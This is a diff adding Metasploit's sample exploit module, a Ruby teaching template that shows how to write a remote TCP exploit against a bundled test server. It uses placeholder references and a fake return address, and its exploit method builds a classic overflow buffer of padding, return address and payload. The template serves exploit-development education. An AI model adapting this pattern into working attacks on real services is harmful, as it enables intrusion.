@@ -1,0 +1,97 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+###
+#
+# This exploit sample shows how an exploit module could be written to exploit
+# a bug in an arbitrary TCP server.
+#
+###
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  #
+  # This exploit affects TCP servers, so we use the TCP client mixin.
+  # See ./documentation/samples/vulnapps/testsrv/testsrv.c for building the
+  # vulnerable target program.
+  #
+  include Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        # The Name should be just like the line of a Git commit - software name,
+        # vuln type, class. It needs to fit in 50 chars ideally. Preferably apply
+        # some search optimization so people can actually find the module.
+        # We encourage consistency between module name and file name.
+        'Name'           => 'Sample Exploit',
+        'Description'    => %q(
+            This exploit module illustrates how a vulnerability could be exploited
+          in an TCP server that has a parsing bug.
+        ),
+        'License'        => MSF_LICENSE,
+        'Author'         => ['skape'],
+        'References'     =>
+          [
+            [ 'OSVDB', '12345' ],
+            [ 'EDB', '12345' ],
+            [ 'URL', 'http://www.example.com'],
+            [ 'CVE', '1978-1234']
+          ],
+        'Payload'        =>
+          {
+            'Space'    => 1000,
+            'BadChars' => "\x00"
+          },
+        'Targets'        =>
+          [
+            # Target 0: Windows All
+            [
+              'Windows XP/Vista/7/8',
+              {
+                'Platform' => 'win',
+                'Ret'      => 0x41424344
+              }
+            ]
+          ],
+        'DisclosureDate' => "Apr 1 2013",
+        # Note that this is by index, rather than name. It's generally easiest
+        # just to put the default at the beginning of the list and skip this
+        # entirely.
+        'DefaultTarget'  => 0
+      )
+    )
+  end
+
+  #
+  # The sample exploit just indicates that the remote host is always
+  # vulnerable.
+  #
+  def check
+    Exploit::CheckCode::Vulnerable
+  end
+
+  #
+  # The exploit method connects to the remote service and sends 1024 random bytes
+  # followed by the fake return address and then the payload.
+  #
+  def exploit
+    connect
+
+    print_status("Sending #{payload.encoded.length} byte payload...")
+
+    # Build the buffer for transmission
+    buf = rand_text_alpha(1024)
+    buf << [ target.ret ].pack('V')
+    buf << payload.encoded
+
+    # Send it off
+    sock.put(buf)
+    sock.get_once
+
+    handler
+  end
+end
